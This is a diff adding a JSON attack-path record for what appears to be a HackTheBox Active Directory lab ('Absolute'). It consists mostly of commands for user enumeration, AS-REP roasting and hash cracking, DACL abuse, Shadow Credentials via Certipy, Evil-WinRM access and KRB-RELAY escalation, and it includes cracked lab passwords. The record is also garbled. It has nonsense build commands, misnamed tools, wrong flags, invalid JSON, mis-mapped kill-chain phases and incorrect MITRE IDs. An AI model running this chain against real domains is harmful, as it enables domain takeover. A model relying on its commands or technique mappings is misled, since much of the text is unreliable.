@@ -1,0 +1,189 @@
+{
+  "id": "ap-0029",
+  "title": "Absolute AD Compromise: AS-REP Roast, DACL Abuse, and KRB-RELAY",
+  "summary": "Compromise of an Active Directory environment that strictly enforces Kerberos authentication (Protected Users Group), achieved through user enumeration, AS-REP roasting, lateral movement via credentials found in LDAP, DACL abuse for Shadow Credentials attack, and local privilege escalation using KRB-RELAY.",
+  "attack_path_markdown": "### Step 1\nInitial enumeration, time synchronization, and user harvesting.\n### Step 2\nAS-REP roasting to obtain initial user credentials.\n### Step 3\nExtensive enumeration via Bloodhound/LDAP leading to discovery of SVC_SMB credentials.\n### Step 4\nExploiting a proprietary executable to capture M.Lovegod's password.\n### Step 5\nAbusing AD ACLs (DACL Edit) to gain Generic Write on a high-value group, followed by a Shadow Credential attack against WinRM_User.\n### Step 6\nExecuting KRB-RELAY locally on the Domain Controller to achieve Domain Administrator privileges.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Identifying the domain, DC hostname, standard AD services, synchronizing time for Kerberos functionality, and harvesting valid usernames from web content metadata.",
+      "actions": [
+        "Perform Nmap scan to identify AD services (DNS 53, LDAP 389, Kerberos 88, SMB 445) .",
+        "Leak domain (`absolute.htb`) and DC hostname (`dc.absolute.htb`) via LDAP/SSL certificates and CrackMapExec .",
+        "Set the hosts file, ensuring the FQDN (`dc.absolute.htb`) is listed first to avoid Kerberos DNS resolution issues .",
+        "Synchronize system time using NTP, essential for Kerberos functionality .",
+        "Recursively download web content using wget .",
+        "Extract potential user names (authors) from file metadata using ExifTool .",
+        "Format harvested names into potential username formats using Username Anarchy .",
+        "Enumerate valid users against the Domain Controller using KrbRoot ."
+      ],
+      "tools": ["nmap", "cme", "wget", "exiftool", "Username Anarchy", "krbroot", "ntpdate", "vi /etc/hosts"],
+      "techniques": ["T1589.002 (Gather Victim Identity Information: Email Addresses)", "T1590.005 (Gather Victim Network Information: DNS)"],
+      "mitre_ids": ["T1589.002", "T1590.005"],
+      "indicators": ["List of open ports/services", "Extracted metadata", "List of valid usernames"],
+      "preconditions": "Network connectivity to the DC/Domain.",
+      "expected_outcome": "List of valid usernames (e.g., J.Roberts, D.Clay).",
+      "confidence": 1.0,
+      "commands": [
+        "nmap -SC -SV -oA absolute 10.10.11.181",
+        "sudo vi /etc/hosts",
+        "sudo ntpdate -s dc.absolute.htb ",
+        "wget -R 10.10.11.181 [7]",
+        "find . -type f -exec exiftool {} \\; ",
+        "find . -type f -exec exiftool {} \\; | grep author ",
+        "ruby username_anarchy -I usernames.txt -F f_last,f.last,first.last,first_last,last.first > temp",
+        "./krbroot userenum --dc dc.absolute.htb --domain absolute.htb -w username.txt"
+      ]
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Building the newest version of KrbRoot and using the downgrade option to request an AS-REP ticket encrypted with the weaker RC4-HMAC E-Type 23, suitable for offline cracking.",
+      "actions": [
+        "Rebuild KrbRoot to ensure the latest version with AS-REP roasting capabilities is used.",
+        "Dump AS-REP hash for users without Kerberos pre-authentication, explicitly requesting downgrade to E-Type 23 (RC4-HMAC)."
+      ],
+      "tools": ["krbroot"],
+      "techniques": ["T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting)"],
+      "mitre_ids": ["T1558.004"],
+      "indicators": ["Hash dumped in E-Type 23 format (18200)"],
+      "preconditions": "List of valid usernames, working Kerberos setup.",
+      "expected_outcome": "AS-REP hash for a domain user (D.Clay).",
+      "confidence": 1.0,
+      "commands": [
+        "go get clone CD curb root go build",
+        "./krbroot userenum --dc dc.absolute.htb --domain absolute.htb -w username.txt --downgrade"
+      ]
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Cracking the harvested AS-REP hash using Hashcat and a common dictionary.",
+      "actions": [
+        "Crack the E-Type 23 hash using Hashcat and a dictionary file (`rockyou.txt`)" .
+      ],
+      "tools": ["hashcat"],
+      "techniques": ["T1110.001 (Brute Force: Password Guessing)"],
+      "mitre_ids": ["T1110.001"],
+      "indicators": ["Plaintext password recovered"],
+      "preconditions": "AS-REP hash in crackable format (E-Type 23).",
+      "expected_outcome": "Password for D.Clay: DarkMoonSky248girl",
+      "confidence": 1.0,
+      "commands": [
+        "hashcat -m 23 absolute.asrep /opt/wordlist/rockyou.txt"
+      ]
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Utilizing the newly obtained credentials to gain authenticated access, establish a Kerberos ticket, and conduct detailed post-exploitation enumeration using Bloodhound and LDAP to discover secondary secrets.",
+      "actions": [
+        "Validate Kerberos authentication using CrackMapExec (CME).",
+        "Obtain a Kerberos Ticket Granting Ticket (TGT) for the compromised user (D.Clay) using Impacket's getTGT.py .",
+        "Perform extensive AD enumeration using Bloodhound, forcing Kerberos authentication (-k flag) .",
+        "Alternatively, use LDAP Search with GSSAPI (Kerberos) to find user descriptions potentially containing secrets .",
+        "Enumerate SMB shares, confirming lack of read access with D.Clay [17]."
+      ],
+      "tools": ["cme", "getTGT.py", "bloodhound.py", "ldapsearch", "kinit"],
+      "techniques": ["T1078.002 (Valid Accounts: Domain Accounts)", "T1087.002 (Account Discovery: Domain Account)"],
+      "mitre_ids": ["T1078.002", "T1087.002"],
+      "indicators": ["Successful Kerberos authentication", "Bloodhound data generated", "New credentials discovered (SVC_SMB)"],
+      "preconditions": "Valid user credentials (D.Clay).",
+      "expected_outcome": "Authenticated session, mapping of AD objects, and SVC_SMB password.",
+      "confidence": 1.0,
+      "commands": [
+        "cme smb 10.10.11.181 -u d.clay -p DarkMoonSky248girl ",
+        "cme smb 10.10.11.181 -u d.clay -p DarkMoonSky248girl -k",
+        "./getTGT.py absolute.htb/d.clay",
+        "./bloodhound.py -k -dc dc.absolute.htb -ns 10.10.11.181 -c All -d absolute.htb -u d.clay",
+        "kinit d.clay [3]",
+        "ldapsearch -Y GSSAPI -b 'CN=users,DC=absolute,DC=htb' user description"
+      ]
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Using discovered SVC_SMB credentials to access a shared folder, retrieving an executable, analyzing its network behavior on a managed Windows environment, and capturing M.Lovegod's credentials.",
+      "actions": [
+        "Obtain a TGT for SVC_SMB using the discovered password .",
+        "Access the 'Shared' SMB share using Kerberos authentication.",
+        "Download `compiler.sh` and `test.exe`.",
+        "Set up IP forwarding/routing rules on the Linux machine to allow access to the HTB network from a Windows host .",
+        "Transfer `test.exe` to the Windows machine (e.g., via HTTP server) .",
+        "Execute `test.exe` while capturing traffic via Wireshark on the routing interface to intercept an LDAP bind containing M.Lovegod's password ."
+      ],
+      "tools": ["getTGT.py", "smbclient.py", "iptables", "python3 -m http.server", "Wireshark"],
+      "techniques": ["T1105 (Ingress Tool Transfer)", "T1552.001 (Unsecured Credentials: Credentials in Files)"],
+      "mitre_ids": ["T1105", "T1552.001"],
+      "indicators": ["Files downloaded via SMB", "LDAP cleartext authentication captured"],
+      "preconditions": "SVC_SMB credentials, network routing configured, ability to run Wireshark.",
+      "expected_outcome": "New credentials for M.Lovegod: absolute!ldap2022$",
+      "confidence": 1.0,
+      "commands": [
+        "./getTGT.py absolute.htb/SVC_SMB [16]",
+        "./smbclient.py -k absolute.htb -I 10.10.11.181 //dc.absolute.htb/shared -c 'get test.exe'",
+        "sudo iptables -t nat -A POSTROUTING -s 192.168.58.0/24 -o tun0 -J MASQUERADE",
+        "python3 -m http.server"
+      ]
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Gaining Generic Write privilege over the WinRM_User via M.Lovegod's ownership of the Network Audit group, executing a Shadow Credentials attack (ESC8/ESC10), and gaining a low-privilege WinRM shell on the DC.",
+      "actions": [
+        "Modify the DACL of the Network Audit group, granting Full Control to M.Lovegod using dacl_edit.py .",
+        "Add D.Clay to the Network Audit group using net RPC .",
+        "Obtain a new TGT for D.Clay to reflect the updated group membership.",
+        "Perform a Shadow Credentials attack using Certipy against the WinRM_User, leveraging Generic Write privileges .",
+        "Establish an interactive shell on the DC as WinRM_User using Evil-WinRM ."
+      ],
+      "tools": ["getTGT.py", "dacl_edit.py", "net rpc", "certipy", "evil-winrm.rb"],
+      "techniques": ["T1098.003 (Account Manipulation: Add Accounts to Groups)", "T1558 (Shadow Credentials/ESC8)", "T1210 (Exploitation of Remote Services)"],
+      "mitre_ids": ["T1098.003", "T1558", "T1210"],
+      "indicators": ["Successful DACL modification", "D.Clay added to group", "WinRM_User TGT obtained", "Low-privilege shell on DC"],
+      "preconditions": "M.Lovegod credentials, D.Clay's TGT, Certipy installed in a working environment.",
+      "expected_outcome": "Interactive shell access to the DC as winrm_user.",
+      "confidence": 1.0,
+      "commands": [
+        "./getTGT.py absolute.htb/m.lovegod",
+        "./dacl_edit.py -k no-pass -dc-ip 10.10.11.181 -principal M.Lovegod -action write -right 'Full Control' absolute.htb/m.lovegod Network\\ Audit",
+        "net rpc group add members Network\\ Audit d.clay -U M.Lovegod -k -S dc.absolute.htb",
+        "./certipy shadow -k no-pass -u absolute.htb/m.lovegod dc.absolute.htb -dc-ip 10.10.11.181 -target dc.absolute.htb -account winrm_user",
+        "./evil-winrm.rb -r absolute.htb -i dc.absolute.htb"
+      ]
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Escalating privileges locally on the DC using the KRB-RELAY attack with the RunAsCS technique to add the WinRM_User to the local Administrators group.",
+      "actions": [
+        "Upload `krb_relay.exe` and `runascs.exe` to a writable directory on the DC (e.g., ProgramData) .",
+        "Execute `krb_relay.exe` via `runascs.exe`, leveraging a known CLSID (e.g., Trusted Installer) and Logon Type 9 (New Credentials) to achieve SYSTEM context relay.",
+        "Use the relayed SYSTEM privilege to add `winrm_user` to the local `Administrators` group .",
+        "Verify group membership and access the final objective."
+      ],
+      "tools": ["krb_relay.exe", "runascs.exe", "evil-winrm.rb (upload/execution)", "net user"],
+      "techniques": ["T1558.003 (Kerberos Relay/Reflection - Post-patch)", "T1098.003 (Account Manipulation: Add Accounts to Groups)"],
+      "mitre_ids": ["T1558.003", "T1098.003"],
+      "indicators": ["User added to Administrators group", "Final objective achieved"],
+      "preconditions": "Low-privilege shell on the DC, executables uploaded.",
+      "expected_outcome": "WinRM_User elevated to local Administrator privilege.",
+      "confidence": 1.0,
+      "commands": [
+        "upload krb_relay.exe",
+        "upload runascs.exe",
+        "runascs.exe -U m.lovegod -D absolute.htb -P absolute!ldap2022$ -L 9 -C \"krb_relay.exe add-group-member administrators winrm_user\" (Implicitly using Trusted Installer CLS ID and fixing quoting issues) ",
+        "net user winrm_user "
+      ]
+    }
+  ],
+  "tactics": ["Reconnaissance", "Credential Access", "Lateral Movement", "Privilege Escalation", "Collection", "Command and Control", "Defense Evasion"],
+  "techniques": ["AS-REP Roasting", "DACL Modification", "Shadow Credentials", "KRB-RELAY", "User Enumeration"],
+  "mitre_ids": ["T1558.004", "T1098.003", "T1558", "T1210"],
+  "hosts": ["dc.absolute.htb (10.10.11.181)"],
+  "privs_obtained": ["domain user (d.clay)", "service account (m.lovegod, svc_smb)", "local admin (winrm_user added to Administrators group on DC)"],
+  "confidence": 1.0,
+  "notes": "The environment forces Kerberos authentication (Protected Users Group), requiring strict adherence to Kerberos standards (e.g., time synchronization, FQDN resolution in /etc/hosts).",
+  "labels": ["attack_path", "kerberos", "active_directory", "asrep_roast", "krbrelay"]
+}
